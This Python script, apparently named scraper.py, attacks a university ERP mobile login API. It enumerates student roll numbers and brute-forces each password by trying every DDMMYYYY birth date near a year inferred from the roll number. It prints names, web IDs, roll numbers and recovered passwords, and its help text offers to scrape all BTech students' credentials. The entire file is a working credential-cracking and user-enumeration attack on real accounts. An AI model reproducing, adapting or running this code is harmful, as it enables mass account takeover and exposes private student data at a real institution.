import os
import sys
from requests import Session

BASE_URL = "https://erp.iith.ac.in/MobileAPI/"

LOGIN_PATH = "GetMobileAppValidatePassword"

BODY = {
    "UserID": "",
    "DeviceType": "android",
    "FCMID" : "9uTC82PwTddsX7-l9My0M9:gQphngqrimY8RNWS3IPzZF4w9g-OU4FNwDpWPNmCQcF0sodLFZyuhU5JOI36faxcOT5f6roRi6oVHgVrprfht5kEMW6ei7LdeuPVlZ4wWHclEZhT2LTjh27ZDut8AcNB01kuz3vEdnpC,OS:33,Model:SM-M325F,BRAND:samsung,MANUFACTURER:samsung,Build ID:TP1A.220624.014",
    "Password": ""
}

req = Session()

def guess_user_yob():

    max_offset = 3
    degree = BODY["UserID"][4:9]
    year = 2000 + int(BODY["UserID"][2:4])
    
    if degree == "btech":
        yob = year - 18
    elif degree == "mtech":
        yob = year - 22
    elif degree == "resch":
        yob = year - 24
    
    yield yob

    for offset in range(1, max_offset + 1):
        yield yob + offset
        yield yob - offset


def get_user_pwd():
    global BODY

    data = req.post(BASE_URL + LOGIN_PATH, json=BODY).json()[0]
    if data["errorId"] == 1 and data["errorMessage"] == "User ID Not found":
        return None

    for yyyy in guess_user_yob():
        for mm in range(1, 13):
            for dd in range(1, 32):
                BODY["Password"] = f"{dd:02d}{mm:02d}{yyyy}"

                data = req.post(BASE_URL + LOGIN_PATH, json=BODY).json()[0]
                if data["errorId"] == 0:
                    return data["referenceId"], data["studentName"], BODY["UserID"], BODY["Password"]
                
    return None, None, BODY["UserID"], None


def get_user_creds():
    global BODY
    
    for degree in degrees:
        for year in years:
            for branch in branches:
                for sno in range(11001, 11101):
                    BODY["UserID"] = f"{branch}{year}{degree}{sno}"
                    if creds := get_user_pwd():
                        print(*creds, sep=",")
                    else:
                        break


def print_help():
    print("\nUsage: (do not include brackets)\n    python scraper.py [-h | --help]; Display this help page", file=sys.stderr)
    print("    python scraper.py [rollno1] [rollno2] ...", file=sys.stderr)
    print("    python scraper.py [file_path]", file=sys.stderr)
    print("    python scraper.py; Scrape all btech students' credentials\n\n", file=sys.stderr)
    print("Input file format:\nrollno1\nrollno2\n...\n", file=sys.stderr)
    print("Output format:\nWebID1,Name1,rollno1,password1\nWebID2,Name2,rollno2,password2\n...\n", file=sys.stderr)


if __name__ == "__main__":
    argc = len(sys.argv)
    if argc > 1:
        
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print_help()
            exit(0)

        elif os.path.exists(sys.argv[1]):
            with open(sys.argv[1], "r") as f:
                user_ids = f.read().splitlines()

        else:
            user_ids = sys.argv[1:]
            if argc == 2:
                print(f"Error: No file found with path {sys.argv[1]}, treating it as rollno.", file=sys.stderr)

        for user_id in user_ids:
            BODY["UserID"] = user_id.strip()
            
            if (creds := get_user_pwd()) is None:
                print(f"Error: No student found with rollno. {user_id}", file=sys.stderr)

            elif creds[0] is None:
                print(f"Error: No password found for {user_id}, try increasing max_offset in guess_user_yob", file=sys.stderr)

            else:
                print(*creds, sep=",")

    else:

        # * the userid scraping function (get_user_id) was designed for btech serial numbers
        # * if you want to scrape for other degrees, change the range values in the get_user_id function accordingly (for sno in range(start, end+1))
        # *     also change the years list accordingly
        degrees = ["btech"] #, "mtech", "resch"]

        years = [21, 22, 23, 24]
        branches = ["ai", "bm", "bt", "ce", "ch", "co", "cs", "ee", "ep", "es", "ic", "ma", "me", "ms"]

        try :
            get_user_creds()
        except KeyboardInterrupt:
            pass
